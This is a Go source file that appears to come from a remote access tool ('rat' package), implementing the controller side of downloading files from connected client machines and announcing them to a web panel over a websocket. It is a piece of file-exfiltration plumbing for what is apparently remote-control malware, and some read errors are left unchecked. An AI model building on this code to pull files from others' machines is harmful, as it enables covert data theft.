package main

import (
	"io"
	"os"
	"rat/command/utils"
	"rat/common"

	"golang.org/x/net/websocket"
)

type Transfer struct {
	Local  *os.File
	Remote string
}

type TransfersMap map[string]Transfer

var Transfers TransfersMap

func init() {
	Transfers = make(TransfersMap)
}

type DownloadPacket struct {
	File string
}

func (packet DownloadPacket) GetHeader() common.PacketHeader {
	return common.GetFileHeader
}

func (packet DownloadPacket) Write(c *Client) error {
	return c.WriteString(packet.File)
}

func (packet DownloadPacket) Read(c *Client) error {
	file, err := c.ReadString()

	if err != nil {
		return err
	}

	final, err := c.ReadBool()

	len, err := c.ReadInt()
	b := make([]byte, len)
	io.ReadFull(c.Conn, b)

	transfer := Transfers[file]
	_, err = transfer.Local.Write(b)

	if err != nil {
		return err
	}

	if final {
		err = transfer.Local.Sync()
		if err != nil {
			return err
		}

		err = transfer.Local.Close()
		if err != nil {
			return err
		}

		delete(Transfers, file)

		// Set temp file mapping so that we can download it from the web panel
		tempKey := utils.Sha256(file)
		TempFiles[tempKey] = transfer.Local.Name()

		if ws, ok := c.Listeners[common.GetFileHeader]; ok {
			event := newEvent(DownloadQueryEvent, c.Id, tempKey)

			err = websocket.JSON.Send(ws, &event)

			if err != nil {
				return err
			}
		}

		delete(c.Listeners, common.GetFileHeader)

		return nil
	}

	return err
}
